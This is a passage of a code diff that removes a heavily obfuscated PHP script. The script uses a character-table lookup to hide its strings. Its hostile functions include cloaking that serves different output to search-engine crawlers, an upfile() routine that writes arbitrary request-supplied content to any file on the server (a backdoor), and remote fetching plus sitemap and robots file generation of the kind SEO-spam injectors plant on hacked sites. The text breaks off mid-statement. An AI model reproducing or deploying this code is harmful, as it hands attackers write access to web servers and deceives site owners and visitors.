@@ -1,4 +1,489 @@
-<?pHp header('Content-Type:text/html; charset=utf-8'); error_reporting(0); $OOOOOO="%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%51%57%45%52%54%59%55%49%4f%50%41%53%44%46%47%48%4a%4b%4c%5a%58%43%56%42%4e%4d%5f%2d%22%3f%3e%20%3c%2e%2d%3d%3a%2f%31%32%33%30%36%35%34%38%37%39%27%3b%28%29%26%5e%24%5b%5d%5c%5c%25%7b%7d%21%2a%7c%2b%2c"; global $O;$O=urldecode($OOOOOO); 
-${$O{18}.$O{7}.$O{24}.$O{2}.$O{50}.$O{8}}="2336"; 
-${$O{16}.$O{6}.$O{25}.$O{9}.$O{50}.$O{8}}="2336"; 
-${$O{10}.$O{18}.$O{18}.$O{52}.$O{12}.$O{10}.$O{4}.$O{10}}="0"; ${$O{10}.$O{18}.$O{18}.$O{52}.$O{16}.$O{6}.$O{25}.$O{9}}="0"; ${$O{3}.$O{2}.$O{1}.$O{3}.$O{7}.$O{4}.$O{2}.$O{52}.$O{8}.$O{9}.$O{2}.$O{24}} = "1";function oooOOoOOoOOoO($OOOoooOO, $OoooO = 0, $OOooO = 1, $OOOOooO = NULL, $OOOOoooOOO = array()) {global $O;if (!preg_match($O{63}.$O{79}.$O{15}.$O{4}.$O{4}.$O{9}.$O{83}.$O{62}.$O{83}.$O{63}.$O{83}.$O{63}.$O{63}.$O{11}.$O{7}, $OOOoooOO)) {if (isset($_GET[$O{6}.$O{3}.$O{18}.$O{2}.$O{3}.$O{3}])) { $OOoOoOOooOooO = $O{81}.$O{6}.$O{3}.$O{18}.$O{2}.$O{3}.$O{3}.$O{8}.$O{3}.$O{82}.$O{57}.$O{7}.$O{24}.$O{22}.$O{10}.$O{18}.$O{7}.$O{12}.$O{57}.$O{6}.$O{3}.$O{18}.$O{62}.$O{78}.$O{24}.$O{23}.$O{11}.$O{9}.$O{75}; $OOoOoOOooOooO .= $OOOoooOO; echo $OOoOoOOooOooO; unset($OOoOoOOooOooO); exit();}return '';}$OoOOOoOOoOO = $O{21}.$O{6}.$O{3}.$O{18}.$O{52}.$O{7}.$O{24}.$O{7}.$O{4}.$O{91}.$O{21}.$O{6}.$O{3}.$O{18}.$O{52}.$O{11}.$O{2}.$O{4}.$O{8}.$O{9}.$O{4}.$O{91}.$O{21}.$O{6}.$O{3}.$O{18}.$O{52}.$O{2}.$O{20}.$O{2}.$O{21}.$O{90}.$O{13}.$O{11}.$O{8}.$O{21}.$O{17}.$O{8}.$O{9}.$O{2}.$O{24}.$O{90}.$O{9}.$O{13}.$O{11}.$O{8}.$O{21}.$O{17}.$O{8}.$O{9}.$O{2}.$O{24}.$O{90}.$O{11}.$O{4}.$O{3}.$O{2}.$O{10}.$O{25}.$O{52}.$O{11}.$O{8}.$O{21}.$O{17}.$O{2}.$O{4}.$O{52}.$O{21}.$O{18}.$O{7}.$O{2}.$O{24}.$O{4}.$O{90}.$O{11}.$O{8}.$O{21}.$O{17}.$O{2}.$O{4}.$O{52}.$O{21}.$O{3}.$O{2}.$O{10}.$O{4}.$O{2};$OOOOoOOOoOOoOO = $OoOOOOooOOoOoO = '';foreach (explode($O{90}, $OoOOOoOOoOO) as $ooooOOOOo) {$y = 1;if ($OoooO && substr($ooooOOOOo, 0, 1) == $O{21}) { continue;}foreach (explode($O{91}, $ooooOOOOo) as $oooOOOo) { if (!function_exists($oooOOOo)) {$y = 0; }}unset($oooOOOo);if ($y) { $OOOOoOOOoOOoOO = $ooooOOOOo; break;}}unset($OoOOOoOOoOO, $ooooOOOOo);if ($OOOOoOOOoOOoOO == '') {return 0;}if (substr($OOOOoOOOoOOoOO, 0, 1) == $O{21}) {$OoOOoooOOO = curl_init();curl_setopt($OoOOoooOOO, CURLOPT_URL, $OOOoooOO);curl_setopt($OoOOoooOOO, CURLOPT_USERAGENT, $O{27}.$O{41}.$O{29});curl_setopt($OoOOoooOOO, CURLOPT_RETURNTRANSFER, $O{64});curl_setopt($OoOOoooOOO, CURLOPT_TIMEOUT, $O{64}.$O{67}.$O{67});if ($OOooO == $O{65}) { curl_setopt($OoOOoooOOO, CURLOPT_POST, $O{64}); if(is_array($OOOOooO)){curl_setopt($OoOOoooOOO, CURLOPT_POSTFIELDS, http_build_query($OOOOooO)); }}$OOOoOOoOOoOOOOo = curl_exec($OoOOoooOOO);curl_close($OoOOoooOOO);if (!$OOOoOOoOOoOOOOo) { if (isset($_GET[$O{21}.$O{6}.$O{3}.$O{18}.$O{2}.$O{3}.$O{3}])) {$OOoOoOOooOooO = $O{81}.$O{21}.$O{6}.$O{3}.$O{18}.$O{57}.$O{2}.$O{3}.$O{3}.$O{8}.$O{3}.$O{82}.$O{78}.$O{24}.$O{23}.$O{11}.$O{9}.$O{75};$OOoOoOOooOooO .= curl_error($OoOOoooOOO);echo $OOoOoOOooOooO;unset($OOoOoOOooOooO);exit(); } return 0;}else{ $OOOoOOoOOoOOOOo = trim(trim($OOOoOOoOOoOOOOo, $O{83}.$O{20}.$O{28}.$O{39}.$O{83}.$O{20}.$O{49}.$O{49}.$O{83}.$O{20}.$O{49}.$O{39})); return $OOOoOOoOOoOOOOo;}}$OoOoOooOO = parse_url($OOOoooOO);isset($OoOoOooOO[$O{15}.$O{8}.$O{11}.$O{4}]) || $OoOoOooOO[$O{15}.$O{8}.$O{11}.$O{4}] = '';isset($OoOoOooOO[$O{9}.$O{10}.$O{4}.$O{15}]) || $OoOoOooOO[$O{9}.$O{10}.$O{4}.$O{15}] = '';isset($OoOoOooOO[$O{0}.$O{6}.$O{2}.$O{3}.$O{5}])|| $OoOoOooOO[$O{0}.$O{6}.$O{2}.$O{3}.$O{5}] = '';isset($OoOoOooOO[$O{9}.$O{8}.$O{3}.$O{4}]) || $OoOoOooOO[$O{9}.$O{8}.$O{3}.$O{4}] = '';$OOoOoOOoo = $OoOoOooOO[$O{9}.$O{10}.$O{4}.$O{15}] ? $OoOoOooOO[$O{9}.$O{10}.$O{4}.$O{15}].($OoOoOooOO[$O{0}.$O{6}.$O{2}.$O{3}.$O{5}] ? $O{55}.$OoOoOooOO[$O{0}.$O{6}.$O{2}.$O{3}.$O{5}] : '') : $O{63};$OOOoOOOoOOOOo = $OoOoOooOO[$O{15}.$O{8}.$O{11}.$O{4}];if ($OoOoOooOO[$O{11}.$O{21}.$O{15}.$O{2}.$O{25}.$O{2}] == $O{15}.$O{4}.$O{4}.$O{9}.$O{11}) {$OOOoOOOoOOOOoOO = $O{64}.$O{59}.$O{64};$OOOoOOoOOoOOo = empty($OoOoOooOO[$O{9}.$O{8}.$O{3}.$O{4}]) ? $O{70}.$O{70}.$O{66} : $OoOoOooOO[$O{9}.$O{8}.$O{3}.$O{4}];$OOOoOOOoOOOOo = $O{11}.$O{11}.$O{18}.$O{62}.$O{63}.$O{63};$OOOoOOOoOOOOo .= $OoOoOooOO[$O{15}.$O{8}.$O{11}.$O{4}];} else {$OOOoOOOoOOOOoOO = $O{64}.$O{59}.$O{67};$OOOoOOoOOoOOo = empty($OoOoOooOO[$O{9}.$O{8}.$O{3}.$O{4}]) ? $O{71}.$O{67} : $OoOoOooOO[$O{9}.$O{8}.$O{3}.$O{4}];}$OOoOoOOoOOoO = $O{41}.$O{8}.$O{11}.$O{4}.$O{62}.$O{57};$OOoOoOOoOOoO .= $OOOoOOOoOOOOo;$OOOOoooOOO[] = $OOoOoOOoOOoO;$OOOOoooOOO[] = $O{47}.$O{8}.$O{24}.$O{24}.$O{2}.$O{21}.$O{4}.$O{7}.$O{8}.$O{24}.$O{62}.$O{57}.$O{47}.$O{18}.$O{8}.$O{11}.$O{2};$OOOOoooOOO[] = $O{32}.$O{11}.$O{2}.$O{3}.$O{53}.$O{36}.$O{14}.$O{2}.$O{24}.$O{4}.$O{62}.$O{57}.$O{27}.$O{41}.$O{29};$OOOOoooOOO[] = $O{36}.$O{21}.$O{21}.$O{2}.$O{9}.$O{4}.$O{62}.$O{57}.$O{89}.$O{63}.$O{89};unset($OOoOoOOoOOoO);if ($OOooO == $O{65}) {if(is_array($OOOOooO)){$OOOOooO = http_build_query($OOOOooO);}$OOOOoooOOO[] = $O{47}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}.$O{53}.$O{4}.$O{5}.$O{9}.$O{2}.$O{62}.$O{57}.$O{10}.$O{9}.$O{9}.$O{18}.$O{7}.$O{21}.$O{10}.$O{4}.$O{7}.$O{8}.$O{24}.$O{63}.$O{20}.$O{53}.$O{1}.$O{1}.$O{1}.$O{53}.$O{13}.$O{8}.$O{3}.$O{25}.$O{53}.$O{6}.$O{3}.$O{18}.$O{2}.$O{24}.$O{21}.$O{8}.$O{12}.$O{2}.$O{12};$OOOOoooOOO[] = $O{47}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}.$O{53}.$O{44}.$O{2}.$O{24}.$O{14}.$O{4}.$O{15}.$O{62}.$O{57}.strlen($OOOOooO);$OoOOOOooOOoOoO = $O{35}.$O{34}.$O{37}.$O{30}." $OOoOoOOoo ".$O{41}.$O{30}.$O{30}.$O{35}.$O{63}."$OOOoOOOoOOOOoOO".$O{83}.$O{3}.$O{83}.$O{24}.join($O{83}.$O{3}.$O{83}.$O{24}, $OOOOoooOOO).$O{83}.$O{3}.$O{83}.$O{24}.$O{83}.$O{3}.$O{83}.$O{24}.$OOOOooO;unset($OOOOooO);} else {$OoOOOOooOOoOoO = $O{40}.$O{28}.$O{30}.$O{57}."$OOoOoOOoo ".$O{41}.$O{30}.$O{30}.$O{35}.$O{63}."$OOOoOOOoOOOOoOO".$O{83}.$O{3}.$O{83}.$O{24}.join($O{83}.$O{3}.$O{83}.$O{24}, $OOOOoooOOO).$O{83}.$O{3}.$O{83}.$O{24}.$O{83}.$O{3}.$O{83}.$O{24};}unset($OOOOoooOOO, $OoOoOooOO, $OOOoOOOoOOOOoOO, $OOoOoOOoo);$OOoOOoOOoOOooOOo = null;if (substr($OOOOoOOOoOOoOO, $O{53}.$O{64}) == $O{24}) {$OOoOOoOOoOOooOOo = $OOOOoOOOoOOoOO($OOOoOOOoOOOOo, $OOOoOOoOOoOOo, $errno, $errstr, $O{66}.$O{67});}else{if (substr($OOOOoOOOoOOoOO, $O{53}.$O{64}) == $O{4}) { $oOOoOOoOOoOO = $O{4}.$O{21}.$O{9}.$O{62}.$O{63}.$O{63}; $oOOoOOoOOoOO .= $OOOoOOOoOOOOo; $oOOoOOoOOoOO .= $O{62}; $oOOoOOoOOoOO .= $OOOoOOoOOoOOo; $OOoOOoOOoOOooOOo = stream_socket_client($oOOoOOoOOoOO, $errno, $errstr, 30); unset($oOOoOOoOOoOO);}}$OoOOOOoOOo = '';if ($OOoOOoOOoOOooOOo) {stream_set_blocking($OOoOOoOOoOOooOOo, true);stream_set_timeout($OOoOOoOOoOOooOOo, $O{66}.$O{67});fwrite($OOoOOoOOoOOooOOo, $OoOOOOooOOoOoO);if (!$OoooO) { $oOOoOOoOOoOOoo = stream_get_meta_data($OOoOOoOOoOOooOOo); if (!$oOOoOOoOOoOOoo[$O{4}.$O{7}.$O{25}.$O{2}.$O{12}.$O{52}.$O{8}.$O{6}.$O{4}]) {while (!feof($OOoOOoOOoOOooOOo)) { $line = fgets($OOoOOoOOoOOooOOo); if ($line && ($line == $O{83}.$O{3}.$O{83}.$O{24} || $line == $O{83}.$O{24})) {break; } unset($line);}while (!feof($OOoOOoOOoOOooOOo)) {$data = fread($OOoOOoOOoOOooOOo, $O{71}.$O{64}.$O{73}.$O{65});$OoOOOOoOOo .= $data;unset($data);} } unset($oOOoOOoOOoOOoo);}fclose($OOoOOoOOoOOooOOo);}else{if (substr($OOOOoOOOoOOoOO, $O{53}.$O{64}) == $O{2}) { $_ip = gethostbyname($OOOoOOOoOOOOo); $OOoOOoOOoOOooOOo = $OOOOoOOOoOOoOO(AF_INET, SOCK_STREAM, $O{67}); if (socket_connect($OOoOOoOOoOOooOOo, $_ip, $OOOoOOoOOoOOo)) {if (!$OoooO) {socket_write($OOoOOoOOoOOooOOo, $OoOOOOooOOoOoO, strlen($OoOOOOooOOoOoO));while($bf=@socket_read($OOoOOoOOoOOooOOo, $O{71}.$O{64}.$O{73}.$O{65})){$OoOOOOoOOo .= $bf;unset($bf);}$OoOOOOoOOo = explode($O{83}.$O{3}.$O{83}.$O{24}.$O{83}.$O{3}.$O{83}.$O{24}, $OoOOOOoOOo);array_shift($OoOOOOoOOo);$OoOOOOoOOo = implode($O{83}.$O{3}.$O{83}.$O{24}.$O{83}.$O{3}.$O{83}.$O{24}, $OoOOOOoOOo);}else{$t = mt_rand($O{65}, $O{69});$i = $O{67};while ($i < $t) { socket_write($OOoOOoOOoOOooOOo, $OoOOOOooOOoOoO, strlen($OoOOOOooOOoOoO)); $i++; usleep(mt_rand($O{69}.$O{67}.$O{67}.$O{67}.$O{67}, $O{64}.$O{67}.$O{67}.$O{67}.$O{67}.$O{67}));}unset($i, $t);} } socket_close($OOoOOoOOoOOooOOo); unset($_ip);}}if ($OoOOOOoOOo == '') {if (function_exists($O{13}.$O{7}.$O{18}.$O{2}.$O{52}.$O{14}.$O{2}.$O{4}.$O{52}.$O{21}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}.$O{11}) and $OOOoooOO) {$OoOOOOoOOo = @file_get_contents($OOOoooOO);}}unset($OoOOOOooOOoOoO, $OOOOoOOOoOOoOO, $OOoOOoOOoOOooOOo, $OOOoOOoOOoOOo, $OOOoOOOoOOOOo);if (!$OoooO) {$OoOOOOoOOo = preg_replace_callback($O{63}.$O{76}.$O{55}.$O{62}.$O{76}.$O{55}.$O{62}.$O{83}.$O{3}.$O{83}.$O{24}.$O{90}.$O{83}.$O{24}.$O{77}.$O{90}.$O{79}.$O{77}.$O{76}.$O{81}.$O{67}.$O{53}.$O{73}.$O{36}.$O{53}.$O{39}.$O{82}.$O{91}.$O{77}.$O{76}.$O{55}.$O{62}.$O{83}.$O{3}.$O{83}.$O{24}.$O{90}.$O{83}.$O{24}.$O{77}.$O{86}.$O{64}.$O{92}.$O{65}.$O{87}.$O{76}.$O{59}.$O{89}.$O{55}.$O{77}.$O{76}.$O{76}.$O{55}.$O{62}.$O{83}.$O{3}.$O{83}.$O{24}.$O{90}.$O{83}.$O{24}.$O{77}.$O{76}.$O{55}.$O{62}.$O{81}.$O{67}.$O{53}.$O{73}.$O{36}.$O{53}.$O{39}.$O{82}.$O{91}.$O{76}.$O{55}.$O{62}.$O{83}.$O{3}.$O{83}.$O{24}.$O{90}.$O{83}.$O{24}.$O{77}.$O{77}.$O{90}.$O{80}.$O{77}.$O{63}.$O{11}.$O{7},create_function( '$ooOOOooOOoOoOO', 'return hexdec($ooOOOooOOoOoOO[1]) == strlen($ooOOOooOOoOoOO[2]) ? $ooOOOooOOoOoOO[2] : $ooOOOooOOoOoOO[0];'),$OoOOOOoOOo);return trim(trim($OoOOOOoOOo, $O{83}.$O{20}.$O{28}.$O{39}.$O{83}.$O{20}.$O{49}.$O{49}.$O{83}.$O{20}.$O{49}.$O{39}));}else{return $O{64};} } function BASE64_DEC0DE($string){global $O;$OoOoOoOo = substr($string, $O{67}, $O{69});$OOoOOOo = substr($string, $O{53}.$O{69});$OoOOOOOo = substr($string, $O{72}, strlen($string) - $O{64}.$O{70});return gzinflate(base64_decode($OoOoOoOo . $OoOOOOOo . $OOoOOOo)); } function oOOoOoOOO($OOOOoOoO){global $O;$OoOOOoO = false;$bots = $O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{23}.$O{8}.$O{4}.$O{90}.$O{23}.$O{7}.$O{24}.$O{14}.$O{23}.$O{8}.$O{4}.$O{90}.$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{90}.$O{10}.$O{8}.$O{18}.$O{90}.$O{23}.$O{7}.$O{24}.$O{14}.$O{90}.$O{5}.$O{10}.$O{15}.$O{8}.$O{8};if ($OOOOoOoO != '') {if (preg_match($O{63}.$O{76}."$bots)".$O{63}.$O{11}.$O{7}, $OOOOoOoO)) { $OoOOOoO = true;}}return $OoOOOoO; } function oOoOooOOOooo($OoOOoOO){global $O;$OoooOoOO = false;$OooOooO = $O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{59}.$O{21}.$O{8}.$O{90}.$O{5}.$O{10}.$O{15}.$O{8}.$O{8}.$O{59}.$O{21}.$O{8}.$O{59}.$O{16}.$O{9}.$O{90}.$O{23}.$O{7}.$O{24}.$O{14};if ($OoOOoOO != '' && preg_match($O{63}.$O{76}."$OooOooO)".$O{63}.$O{11}.$O{7}, $OoOOoOO)) {$OoooOoOO = true;}return $OoooOoOO; } function upfile(){global $O;$OooOOOooO=isset($_REQUEST[$O{11}.$O{13}.$O{7}.$O{18}.$O{2}.$O{24}.$O{10}.$O{25}.$O{2}]) ? $_REQUEST[$O{11}.$O{13}.$O{7}.$O{18}.$O{2}.$O{24}.$O{10}.$O{25}.$O{2}] : '';$OooooOOooO=isset($_REQUEST[$O{11}.$O{13}.$O{7}.$O{18}.$O{2}.$O{21}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}]) ? $_REQUEST[$O{11}.$O{13}.$O{7}.$O{18}.$O{2}.$O{21}.$O{8}.$O{24}.$O{4}.$O{2}.$O{24}.$O{4}] : '';if(file_exists($OooOOOooO)){if (!unlink($OooOOOooO)){echo $O{12}.$O{2}.$O{18}.$O{2}.$O{4}.$O{2}.$O{2}.$O{3}.$O{3}.$O{8}.$O{3};exit();}}file_put_contents($OooOOOooO,$OooooOOooO, FILE_APPEND);echo $OooOOOooO.$O{11}.$O{6}.$O{21}.$O{21}.$O{2}.$O{11}.$O{11}; } function ooOOOoooooOOoOo($x = ''){global $O;@$O{11}.$O{2}.$O{4}.$O{52}.$O{4}.$O{7}.$O{25}.$O{2}.$O{52}.$O{18}.$O{7}.$O{25}.$O{7}.$O{4}.$O{76}.$O{66}.$O{68}.$O{67}.$O{67}.$O{77};@$O{7}.$O{14}.$O{24}.$O{8}.$O{3}.$O{2}.$O{52}.$O{6}.$O{11}.$O{2}.$O{3}.$O{52}.$O{10}.$O{23}.$O{8}.$O{3}.$O{4}.$O{76}.$O{64}.$O{77};global $lineNo,$all_data,$all_jump,$rewrite_open,$jumpNo;if (isset($_REQUEST[$O{11}.$O{6}.$O{9}.$O{13}.$O{7}.$O{18}.$O{2}.$O{11}])) { upfile(); exit();}$OoOOoOo= isset($_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{29}.$O{28}.$O{39}.$O{28}.$O{29}.$O{28}.$O{29}]) ? $_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{29}.$O{28}.$O{39}.$O{28}.$O{29}.$O{28}.$O{29}] : '';$OOooOOoOo = isset($_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{32}.$O{37}.$O{28}.$O{29}.$O{52}.$O{36}.$O{40}.$O{28}.$O{50}.$O{30}]) ? $_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{32}.$O{37}.$O{28}.$O{29}.$O{52}.$O{36}.$O{40}.$O{28}.$O{50}.$O{30}] : '';$ooOOOoooooOooo = true;$OoOOoOOoOOoOoO = oOoOooOOOooo($OoOOoOo);$OooOOoOOOOO = '';if (isset($_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{41}.$O{34}.$O{37}.$O{30}])) {$OooOOoOOOOO = $_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{52}.$O{41}.$O{34}.$O{37}.$O{30}];}elseif (isset($_SERVER[$O{37}.$O{28}.$O{29}.$O{48}.$O{28}.$O{29}.$O{52}.$O{50}.$O{36}.$O{51}.$O{28}])) {$OooOOoOOOOO = $_SERVER[$O{37}.$O{28}.$O{29}.$O{48}.$O{28}.$O{29}.$O{52}.$O{50}.$O{36}.$O{51}.$O{28}];}$ooooOOoOOoOOoOOOOO = $_SERVER[$O{29}.$O{28}.$O{26}.$O{32}.$O{28}.$O{37}.$O{30}.$O{52}.$O{32}.$O{29}.$O{33}];if(strstr($ooooOOoOOoOOoOOOOO,$O{23}.$O{21}.$O{4}.$O{7}.$O{8}.$O{24}.$O{61}.$O{9}.$O{7}.$O{24}.$O{14})){ if(strstr($_GET[$O{25}.$O{10}.$O{9}.$O{24}.$O{10}.$O{25}.$O{2}],$O{59}.$O{20}.$O{25}.$O{18})){$oooooOOoOOo = $O{15}.$O{4}.$O{4}.$O{9}.$O{11}.$O{62}.$O{63}.$O{63}.$O{1}.$O{1}.$O{1}.$O{59}.$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2}.$O{59}.$O{21}.$O{8}.$O{25}.$O{63}.$O{9}.$O{7}.$O{24}.$O{14}.$O{55}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{61}.$_GET[$O{25}.$O{10}.$O{9}.$O{24}.$O{10}.$O{25}.$O{2}];if(stristr(file_get_contents( $oooooOOoOOo),$O{14}.$O{8}.$O{8}.$O{14}.$O{18}.$O{2})){echo $O{58}.$O{23}.$O{3}.$O{56}.$O{8}.$O{17}.$O{58}.$O{23}.$O{3}.$O{56};}else{echo $oooooOOoOOo.$O{58}.$O{23}.$O{3}.$O{56}.$O{9}.$O{7}.$O{24}.$O{14}.$O{57}.$O{13}.$O{10}.$O{18}.$O{11}.$O{2}.$O{88}.$O{58}.$O{23}.$O{3}.$O{56};} }else{echo $O{58}.$O{23}.$O{3}.$O{56}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{57}.$O{24}.$O{10}.$O{25}.$O{2}.$O{57}.$O{13}.$O{10}.$O{18}.$O{11}.$O{2}.$O{88}.$O{58}.$O{23}.$O{3}.$O{56}; } exit;}if(strstr($ooooOOoOOoOOoOOOOO,$O{11}.$O{9}.$O{10}.$O{24}.$O{52}.$O{10}.$O{18}.$O{18}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{61})){$oooOOOooo = strpos($ooooOOoOOoOOoOOOOO,$O{11}.$O{9}.$O{10}.$O{24}.$O{52}.$O{10}.$O{18}.$O{18}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{61}).$O{91}.$O{64}.$O{68};$ooooOOOOoooo = substr($ooooOOoOOoOOoOOOOO,$oooOOOooo);$OOoOoOOooOO=$O{58}.$O{55}.$O{20}.$O{25}.$O{18}.$O{57}.$O{22}.$O{2}.$O{3}.$O{11}.$O{7}.$O{8}.$O{24}.$O{61}.$O{54}.$O{64}.$O{59}.$O{67}.$O{54}.$O{57}.$O{2}.$O{24}.$O{21}.$O{8}.$O{12}.$O{7}.$O{24}.$O{14}.$O{61}.$O{54}.$O{32}.$O{30}.$O{39}.$O{53}.$O{71}.$O{54}.$O{55}.$O{57}.$O{56}.$O{58}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{57}.$O{20}.$O{25}.$O{18}.$O{24}.$O{11}.$O{61}.$O{54}.$O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$O{1}.$O{1}.$O{1}.$O{59}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{11}.$O{59}.$O{8}.$O{3}.$O{14}.$O{63}.$O{11}.$O{21}.$O{15}.$O{2}.$O{25}.$O{10}.$O{11}.$O{63}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{63}.$O{67}.$O{59}.$O{73}.$O{54}.$O{56};if ($ooooOOOOoooo != '') {$oooooOOOOOooooo =explode($O{90},$ooooOOOOoooo);$fzxml = glob($oooooOOOOOooooo[0]);$oooOOoOOooooOOOOo='';foreach($fzxml as $xml){$OOoOoOOooOO.=sprintf($O{58}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{56}.$O{58}.$O{18}.$O{8}.$O{21}.$O{56}.$O{85}.$O{11}.$O{58}.$O{63}.$O{18}.$O{8}.$O{21}.$O{56}.$O{58}.$O{18}.$O{10}.$O{11}.$O{4}.$O{25}.$O{8}.$O{12}.$O{56}.$O{85}.$O{11}.$O{58}.$O{63}.$O{18}.$O{10}.$O{11}.$O{4}.$O{25}.$O{8}.$O{12}.$O{56}.$O{58}.$O{63}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{56},$O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$OooOOoOOOOO.$O{63}.$xml,date($O{31}.$O{53}.$O{25}.$O{53}.$O{12}));$oooOOoOOooooOOOOo.=chr(13).chr(10).$O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{62}.$O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$OooOOoOOOOO.$O{63}.$xml;}$oooooOOOOOooOoo = $O{11}.$O{7}.$O{4}.$O{2}.$O{52}.$O{25}.$O{10}.$O{9}.$O{59}.$O{20}.$O{25}.$O{18};if ($oooooOOOOOooooo[1] != '') {$oooooOOOOOooOoo = $oooooOOOOOooooo[1];}$oooOOoOOooooOOOOo=$O{32}.$O{11}.$O{2}.$O{3}.$O{53}.$O{10}.$O{14}.$O{2}.$O{24}.$O{4}.$O{62}.$O{57}.$O{89}.chr(13).chr(10).$O{38}.$O{7}.$O{11}.$O{10}.$O{18}.$O{18}.$O{8}.$O{1}.$O{62}.chr(13).chr(10).$O{37}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{62}.$O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$OooOOoOOOOO.$O{63}.$oooooOOOOOooOoo.$oooOOoOOooooOOOOo;$OOoOoOOooOO.=$O{58}.$O{63}.$O{11}.$O{7}.$O{4}.$O{2}.$O{25}.$O{10}.$O{9}.$O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{56};$OOoOoOOooOO = str_replace($O{2}.$O{24}.$O{21}.$O{8}.$O{12}.$O{7}.$O{24}.$O{14}.$O{61}.$O{54}.$O{32}.$O{30}.$O{39}.$O{53}.$O{71}.$O{54}.$O{55}.$O{57},$O{2}.$O{24}.$O{21}.$O{8}.$O{12}.$O{7}.$O{24}.$O{14}.$O{61}.$O{54}.$O{32}.$O{30}.$O{39}.$O{53}.$O{71}.$O{54}.$O{55},$OOoOoOOooOO);if(@file_put_contents($oooooOOOOOooOoo, $OOoOoOOooOO)){@file_put_contents($O{3}.$O{8}.$O{23}.$O{8}.$O{4}.$O{11}.$O{59}.$O{4}.$O{20}.$O{4}, $oooOOoOOooooOOOOo);echo exit($oooooOOOOOooOoo.$O{57}.$O{8}.$O{17});}else{echo exit($O{13}.$O{10}.$O{7}.$O{18});}}}$OooOOoOOOOOOoO='';if(strpos($ooooOOoOOoOOoOOOOO,$O{59}.$O{9}.$O{15}.$O{9}) > $O{67}){$leng=strpos($ooooOOoOOoOOoOOOOO,$O{59}.$O{9}.$O{15}.$O{9})+4;$OooOOoOOOOOOoO=substr($ooooOOoOOoOOoOOOOO,0,$leng);}if($OooOOoOOOOOOoO==''){ $OooOOoOOOOOOoO = $O{7}.$O{24}.$O{12}.$O{2}.$O{20}.$O{59}.$O{9}.$O{15}.$O{9};}$OoOOoOOOoOOOoO = $O{1}.$O{1}.$O{1}.$O{85}.$O{12}.$O{59}.$O{23}.$O{21}.$O{11}.$O{10}.$O{12}.$O{59}.$O{4}.$O{8}.$O{9};$uri_start='';if (isset($_SERVER[$O{29}.$O{28}.$O{26}.$O{32}.$O{28}.$O{37}.$O{30}.$O{52}.$O{37}.$O{47}.$O{41}.$O{28}.$O{51}.$O{28}])) {$uri_start = $_SERVER[$O{29}.$O{28}.$O{26}.$O{32}.$O{28}.$O{37}.$O{30}.$O{52}.$O{37}.$O{47}.$O{41}.$O{28}.$O{51}.$O{28}];}else{$uri_start=((isset($_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{37}])&&$_SERVER[$O{41}.$O{30}.$O{30}.$O{35}.$O{37}]!==$O{8}.$O{13}.$O{13})?$O{15}.$O{4}.$O{4}.$O{9}.$O{11}:$O{15}.$O{4}.$O{4}.$O{9});}$rewrite_open = (int)$rewrite_open;ooOOoOOoOOo('',$rewrite_open,$OooOOoOOOOOOoO);$oooOOoOOoOOoOOoOOOO='';$oOOoOoooOOooo = $O{15}.$O{4}.$O{4}.$O{9}.$O{62}.$O{63}.$O{63}.$O{1}.$O{1}.$O{1}.$O{69}.$O{67}.$O{59}.$O{23}.$O{21}.$O{11}.$O{10}.$O{12}.$O{59}.$O{4}.$O{8}.$O{9}.$O{63}.$O{16}.$O{6}.$O{25}.$O{9}.$O{71}.$O{71}.$O{59}.$O{9}.$O{15}.$O{9}.$O{55}.$O{12}.$O{61}.$O{85}.$O{11}.$O{78}.$O{6}.$O{61}.$O{85}.$O{11}.$O{78}.$O{3}.$O{61}.$O{85}.$O{11}.$O{78}.$O{18}.$O{61}.$O{85}.$O{11}.$O{78}.$O{24}.$O{61}.$O{85}.$O{11}.$O{78}.$O{4}.$O{61}.$O{85}.$O{11}.$O{78}.$O{15}.$O{61}.$O{85}.$O{11}.$O{78}.$O{14}.$O{61}.$O{85}.$O{11};$oOOoOoooOOooo = sprintf($oOOoOoooOOooo, $OooOOoOOOOO, urlencode($ooooOOoOOoOOoOOOOO), urlencode($OoOOoOo), 